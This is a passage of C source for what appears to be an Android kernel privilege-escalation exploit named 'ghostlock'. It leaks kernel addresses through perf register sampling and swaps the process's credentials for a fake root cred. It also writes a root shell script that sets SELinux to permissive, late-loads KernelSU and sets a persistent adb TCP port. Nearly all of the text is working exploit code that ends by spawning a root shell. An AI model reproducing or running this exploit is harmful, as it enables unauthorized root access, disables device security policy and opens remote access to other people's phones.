  int sfd = open("/data/local/tmp/.ghostlock_root.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
  if (sfd < 0) return;
  int policy_script_ready = write_selinux_policy_fix_script();
  unlink("/data/local/tmp/.ghostlock_ksu.status");
  const char *script =
    "#!/system/bin/sh\n"
    "ROOT_LOG=/data/local/tmp/.ghostlock_root.log\n"
    "STATUS=/data/local/tmp/.ghostlock_ksu.status\n"
    "diag() { echo \"$*\"; echo \"$*\" >>$ROOT_LOG; }\n"
    "report_status() { printf '%s\\n' \"$1\" >$STATUS; }\n"
    "report_status pending\n"
    "diag '[+] root shell pid='$$' uid='$(id -u)\n"
    "if [ -x /data/local/tmp/.ghostlock_fixpol.sh ]; then\n"
    "  diag '[*] repairing SELinux policy before KernelSU'\n"
    "  if /system/bin/sh /data/local/tmp/.ghostlock_fixpol.sh; then\n"
    "    diag '[+] early SELinux policy repair succeeded'\n"
    "    diag '[*] keeping SELinux permissive until KernelSU is ready'\n"
    "  else\n"
    "    diag '[!] early SELinux policy repair failed; see .ghostlock_policy.log'\n"
    "  fi\n"
    "  rm -f /data/local/tmp/.ghostlock_fixpol.sh\n"
    "else\n"
    "  diag '[!] policy repair script was not created'\n"
    "fi\n"
    "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
    "KSU_READY=0\n"
    "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
    "  diag '[+] KernelSU already loaded'\n"
    "  KSU_READY=1\n"
    "elif [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
    "  diag '[*] ksud:' $KSUD\n"
    "  chmod 755 \"$KSUD\" 2>/dev/null\n"
    "  KVER=$(uname -r | cut -d. -f1-2)\n"
    "  AVER=$(uname -r | grep -o 'android[0-9]*')\n"
    "  KMI=\"${AVER}-${KVER}\"\n"
    "  diag '[*] KMI=' $KMI\n"
    "  mkdir -p /data/adb/ksu 2>/dev/null\n"
    "  diag '[*] ksud late-load --kmi' $KMI\n"
    "  KSUD_LOG=/data/local/tmp/.ghostlock_ksud.log\n"
    "  rm -f \"$KSUD_LOG\"\n"
    "  setsid \"$KSUD\" late-load --kmi \"$KMI\" </dev/null >\"$KSUD_LOG\" 2>&1 &\n"
    "  KSUD_PID=$!\n"
    "  diag '[*] ksud pid='$KSUD_PID\n"
    "  KSUD_EXITED=0\n"
    "  for w in $(seq 1 30); do\n"
    "    if ! kill -0 \"$KSUD_PID\" 2>/dev/null; then KSUD_EXITED=1; break; fi\n"
    "    sleep 1\n"
    "  done\n"
    "  if [ \"$KSUD_EXITED\" = 1 ]; then\n"
    "    wait \"$KSUD_PID\"; KSUD_STATUS=$?\n"
    "    diag '[*] ksud exit='$KSUD_STATUS\n"
    "  else\n"
    "    diag '[!] ksud still running after 30s; capturing process state'\n"
    "    cat /proc/$KSUD_PID/status >>$ROOT_LOG 2>&1\n"
    "    cat /proc/$KSUD_PID/wchan >>$ROOT_LOG 2>&1\n"
    "  fi\n"
    "  if [ -s \"$KSUD_LOG\" ]; then\n"
    "    diag '[*] ksud output:'\n"
    "    tail -n 40 \"$KSUD_LOG\"\n"
    "    tail -n 40 \"$KSUD_LOG\" >>$ROOT_LOG\n"
    "  fi\n"
    "fi\n"
    "if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; fi\n"
    "if [ \"$KSU_READY\" = 1 ]; then\n"
    "  diag '[+] KSU LOADED'\n"
    "  grep kernelsu /proc/modules\n"
    "  RSPROP=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "  if [ -n \"$RSPROP\" ]; then\n"
    "    chmod 755 \"$RSPROP\" 2>/dev/null\n"
    "    ADB_PORT=$(cat /data/local/tmp/a/adb_port 2>/dev/null || echo 5555)\n"
    "    \"$RSPROP\" resetprop -p persist.adb.tcp.port $ADB_PORT 2>&1 && echo \"[+] persist.adb.tcp.port=$ADB_PORT set via resetprop\"\n"
    "    \"$RSPROP\" resetprop service.adb.tcp.port $ADB_PORT 2>/dev/null\n"
    "  fi\n"
    "  rm -f /data/local/tmp/.ghostlock_w1\n"
    "  APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed 's/package://')\n"
    "  if [ -n \"$APK\" ] && [ -x /data/adb/ksud ]; then\n"
    "    /data/adb/ksud kernel dynamic-manager set-apk \"$APK\" 2>/dev/null && echo '[+] dynamic manager set'\n"
    "  fi\n"
    "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "  diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "  report_status ready\n"
    "  diag '[+] done'\n"
    "else\n"
    "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "  diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "  report_status failed:module-not-loaded\n"
    "  diag '[!] KSU NOT loaded'\n"
    "fi\n"
    "if [ -t 0 ]; then exec /system/bin/sh -i; fi\n";
  if (!policy_script_ready) {
    pr_info("root script: early policy repair script unavailable\n");
  }
  write(sfd, script, strlen(script));
  close(sfd);
}

uint64_t g_leaked_task = 0;
int g_route_write_ok = 0;

/* Leak our own task_struct via PERF_SAMPLE_REGS_INTR: on this kernel
 * `current` lives in SP_EL0 and every syscall path loads it into a normal
 * x register (mrs x8, SP_EL0), so a getpid storm makes the task pointer
 * the modal kernel value in the sampled registers. */
static uintptr_t perf_leak_own_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 31) - 1; /* x0-x30 */
  pe.disabled = 1;

  uint32_t my_tid = (uint32_t)syscall(__NR_gettid);

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 3000000; i++) { syscall(__NR_getpid); __asm__ volatile("yield"); }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[1024]; int nc = 0;
  uint64_t min_ip = (uint64_t)-1;
  int total_samples = 0, my_samples = 0;
  while (pos < head && nc < 1024 * 32) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      /* sample layout: IP(8) + TID{pid(4),tid(4)} + ABI(8) + REGS(31*8) */
      char *p = (char *)ev + sizeof(*ev);
      uint64_t ip; memcpy(&ip, p, 8); p += 8;
      uint32_t s_pid, s_tid;
      memcpy(&s_pid, p, 4); memcpy(&s_tid, p + 4, 4); p += 8;
      if (ip >= 0xffffffc000000000ULL && ip < min_ip) min_ip = ip;
      total_samples++;
      if (s_tid == my_tid) {
        my_samples++;
        uint64_t abi = *(uint64_t *)p; p += 8;
        if (abi == 1 || abi == 2) {
          uint64_t *regs = (uint64_t *)p;
          for (int i = 0; i < 31 && nc < 1024 * 32; i++) {
            uint64_t v = regs[i];
            if (v >= 0xffffff8000000000ULL && v < 0xffffffc000000000ULL)
              cands[nc++ & 1023] = v;
          }
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  pr_info("perf task: %d/%d samples from tid %u\n", my_samples, total_samples, my_tid);
  if (min_ip != (uint64_t)-1) {
    kaslr_base = (min_ip & ~0x1fffffULL) | 0x80000ULL;
    if (kaslr_base > min_ip) kaslr_base -= 0x200000ULL;
    kaslr_done = 1;
  }
  if (!nc) return 0;
  /* mode of candidates */
  uintptr_t best = 0; int best_cnt = 0;
  int total = nc > 1024 ? 1024 : nc;
  for (int i = 0; i < total; i++) {
    int cnt = 0;
    for (int j = 0; j < total; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf own task: 0x%016lx (%d/%d votes)\n", best, best_cnt, total);
  return best;
}

/* Leak &init_user_ns: setpriority(-20) is denied but still runs the full
 * capable(CAP_SYS_NICE) path where security_capable(current_cred(),
 * &init_user_ns, ...) hands &init_user_ns to the SELinux hook chain
 * (x0=cred, x1=ns in selinux_capable). Collect modal image-VA pointers. */
#define MAX_NS_CANDS 16
static int perf_leak_init_user_ns(uintptr_t task, uintptr_t *out) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 2000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 31) - 1;
  pe.disabled = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open(ns) failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap(ns) failed\n"); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 60000; i++) {
    setpriority(PRIO_PROCESS, 0, -20);
    syscall(__NR_getpid);
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[512]; int nc = 0;
  while (pos < head && nc < 512 * 16) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 31 && nc < 512 * 16; i++) {
          uint64_t v = regs[i];
          /* image VA range (text+rodata+data): kaslr_base .. +0x1d00000 */
          if (v >= kaslr_base && v < kaslr_base + 0x1D00000ULL &&
              (v & 7) == 0 && v != task)
            cands[nc++ & 511] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  /* rank by frequency */
  int total = nc > 512 ? 512 : nc;
  uintptr_t ranked[MAX_NS_CANDS]; int ranked_cnt[MAX_NS_CANDS]; int nrank = 0;
  for (int i = 0; i < total && nrank < MAX_NS_CANDS; i++) {
    int found = -1;
    for (int j = 0; j < nrank; j++) if (ranked[j] == cands[i]) { found = j; break; }
    if (found >= 0) { ranked_cnt[found]++; continue; }
    ranked[nrank] = cands[i]; ranked_cnt[nrank] = 1; nrank++;
  }
  /* sort desc */
  for (int i = 0; i < nrank - 1; i++)
    for (int j = i + 1; j < nrank; j++)
      if (ranked_cnt[j] > ranked_cnt[i]) {
        uintptr_t t = ranked[i]; ranked[i] = ranked[j]; ranked[j] = t;
        int tc = ranked_cnt[i]; ranked_cnt[i] = ranked_cnt[j]; ranked_cnt[j] = tc;
      }
  for (int i = 0; i < nrank && i < MAX_NS_CANDS; i++)
    out[i] = ranked[i];
  int got = nrank < MAX_NS_CANDS ? nrank : MAX_NS_CANDS;
  for (int i = 0; i < got; i++)
    pr_info("init_user_ns candidate[%d]: %016lx (%d votes)\n", i,
            (unsigned long)out[i], ranked_cnt[i]);
  return got;
}

/* perf_find_task - only used when perf is available (shell context) */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  uintptr_t my_task = perf_find_task();
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task) _exit(1);
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
    else if (cmd == 'G') break;
  }
  close(p->cmd_r); close(p->uid_w);
  if (getuid() != 0) _exit(1);
  pid_t gc = fork();
  if (gc == 0) {
    int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
    if (efd >= 0) { write(efd, "0", 1); close(efd); }
    execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
    _exit(1);
  }
  if (gc < 0) _exit(1);
  int status = 0;
  while (waitpid(gc, &status, 0) < 0) {
    if (errno == EINTR) continue;
    _exit(1);
  }
  if (WIFEXITED(status)) _exit(WEXITSTATUS(status));
  if (WIFSIGNALED(status)) _exit(128 + WTERMSIG(status));
  _exit(1);
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

static int run_selftest(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) kaslr_base = active_offsets->kimage_text_base;
  kaslr_done = 1;
  timer_reset();
  TIMER("exploit start");

  ghost_reset_plans();
  pr_info("selftest: mode 5 write into spray page\n");
  do_one_write(0, "selftest write", 5);
  pr_info("selftest result: %s (g_route_write_ok=%d)\n",
          g_route_write_ok ? "WRITE VERIFIED" : "write FAILED",
          g_route_write_ok);
  return g_route_write_ok ? 0 : 1;
}

/* --cred: task_struct leak (perf regs) + init_user_ns leak (perf regs,
 * validated live through the fake cred) + two-walk route:
 *   walk 0: task->cred = fake_cred (uid 0, caps FULL, page blob/kernel sid,
 *           user_ns = leaked &init_user_ns, fake user/ucounts/group_info)
 *   walk 1: zero fake_cred+4 (repairs uid/gid clobbered by walk 0's
 *           child->__rb_parent_color = pc side-effect)
 * The user_ns candidate is validated by editing the live page (SQE mmap)
 * and retrying setpriority(-20) - wrong candidates only cost an EPERM. */
static int run_cred_swap(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) kaslr_base = active_offsets->kimage_text_base;
  kaslr_done = 1;
  timer_reset();
  TIMER("exploit start");

  /* 1. leak own task */
  g_leaked_task = perf_leak_own_task();
  if (!g_leaked_task) {
    pr_error("task leak failed - cannot proceed\n");
    return 1;
  }
  pr_info("cred mode: task=%016lx (fake user_ns on spray page)\n",
          (unsigned long)g_leaked_task);

  uint32_t uid_before = getuid();
  int attempts = env_int_range("CRED_ATTEMPTS", 3, 1, 6);
  for (int att = 1; att <= attempts; att++) {
    pr_info("cred swap attempt %d/%d\n", att, attempts);
    /* NOTE: no slab_drain here! Its 400-2000 unpinned fork+exit pairs churn
     * the mm cache's partial lists with MIXED pages (foreign live mms + free
     * slots) on every CPU - the leak child's mm then lands on such a page,
     * the choreography can never empty it, no discard happens and the walk
     * fires on the stale mm page (kernel panic). The sacrificial burst in
     * prepare_kernel_page handles the mixed-page draining instead. */
    if (env_flag("CRED_SLAB_DRAIN", 0))
      slab_drain();
    g_consumer_task = 0;
    /* Target cred (+0x7F8): getuid + exec use current->cred */
    if (!do_one_write(g_leaked_task + TASK15_CRED_OFF, "cred swap", 6)) continue;
    uint32_t uid_now = getuid();
    pr_info("getuid: %u -> %u (g_route_write_ok=%d)\n",
            uid_before, uid_now, g_route_write_ok);
    if (g_route_write_ok && (uid_now == 0 || uid_now == 0xffffff80u)) {
      /* ZERO libc calls. hb->lock wedge makes even snprintf/malloc block. */
      {
        /* Write marker using raw write (no snprintf, no malloc) */
        const char *marker = "root=1\n";
        int mf = (int)syscall(__NR_openat, AT_FDCWD,
                              "/data/local/tmp/.ghostlock_root",
                              O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if (mf >= 0) {
          syscall(__NR_write, mf, marker, 7);
          syscall(__NR_close, mf);
        }
      }
      /* Exec. commit_creds copies fake_cred into a slab cred. */
      {
        char *const argv[] = {"/system/bin/sh", "-c",
          "echo GHOSTLOCK_ROOT; id; cat /proc/self/status | head -10;"
          " ls -la /data /system /; echo GHOSTLOCK_DONE", NULL};
        syscall(__NR_execve, "/system/bin/sh", argv, environ);
      }
      syscall(__NR_exit_group, 99);
      return 0;
    }
  }
  pr_error("cred swap failed after %d attempts\n", attempts);
  return 1;
}

#include <signal.h>
static void ghost_segv_handler(int sig, siginfo_t *si, void *uc) {
  char b[160];
  int n = snprintf(b, sizeof(b),
      "[FATAL] signal %d at addr %p (main thread died post-cred-swap?)\n",
      sig, si->si_addr);
  write(1, b, n);
  _exit(139);
}

int main(int argc, char **argv) {
    struct sigaction sa = { .sa_sigaction = ghost_segv_handler,
                            .sa_flags = SA_SIGINFO };
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    /* A broken/EOF stdout (adb hiccup, terminal close) must not SIGPIPE-kill
     * the exploit mid-run: the cred swap + exec path prints to stdout right
     * before execl(), and a SIGPIPE there silently kills the whole process
     * before the root shell can spawn. Ignored dispositions survive exec. */
    signal(SIGPIPE, SIG_IGN);
    if (argc > 1 && strcmp(argv[1], "--selftest") == 0)
        return run_selftest();
    if (argc > 1 && strcmp(argv[1], "--cred") == 0)
        return run_cred_swap();
    return run_cred_swap();
}
